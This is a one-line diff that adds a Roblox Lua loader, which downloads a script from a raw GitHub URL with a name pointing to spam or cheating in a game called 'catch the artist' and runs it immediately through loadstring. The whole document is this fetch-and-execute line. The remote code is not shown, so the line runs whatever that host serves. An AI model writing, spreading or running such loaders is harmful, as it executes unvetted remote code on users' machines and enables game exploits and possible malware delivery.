@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/catch-the-artist-spam5-jhy7pgwdik1dz6.lua"))()
